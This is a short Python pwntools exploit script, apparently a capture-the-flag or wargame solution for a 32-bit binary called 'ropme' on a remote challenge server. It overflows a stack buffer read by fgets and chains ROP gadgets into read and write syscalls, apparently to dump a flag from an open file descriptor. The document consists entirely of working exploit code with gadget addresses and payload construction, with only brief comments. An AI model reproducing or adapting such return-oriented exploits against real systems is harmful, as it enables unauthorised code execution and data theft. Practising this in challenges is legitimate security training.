from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
fgets(ebp-0x8, 0x539, stdin)
"""

# p = process("./ropme")
p = remote("plsdonthaq.me", 6004)


'''
0x08048379: pop ebx; ret; 
0x080484ef: xor edx, edx; ret; 
0x08048500: mov eax, edx; mov ebx, edx; ret; 
0x080484f2: int 0x80; ret; 
'''

payload = b""
payload += b'.' * (0x8+4)

payload += p32(0x08048362) * 30 # ret;    create 30*4=120 spare bytes to use in addition to the buffer

# Read
# eax = 3 (read)
# ebx = 3 (fd)
# ecx :: ptr to buffer
# edx = 120
payload += p32(0x080484ef)        # xor edx, edx; ret; 
payload += p32(0x08048505) * 3    # inc edx; ret; * 3
payload += p32(0x08048500)        # mov eax, edx; mov ebx, edx; ret; 
payload += p32(0x08048505) * 117  # inc edx; ret; * 117
payload += p32(0x080484f2)        # int 0x80; ret; 

# eax = 4 (write)
# ebx = 1 (stdout)
# ecx :: ptr to buffer
# edx = 120
payload += p32(0x080484ef)        # xor edx, edx; ret; 
payload += p32(0x08048505) * 4    # inc edx; ret; * 4
payload += p32(0x08048500)        # mov eax, edx; mov ebx, edx; ret; 
payload += p32(0x08048379)        # pop ebx; ret;
payload += p32(1)
payload += p32(0x08048505) * 116  # inc edx; ret; * 116
payload += p32(0x080484f2)        # int 0x80; ret; 


p.sendline(payload)
p.interactive()
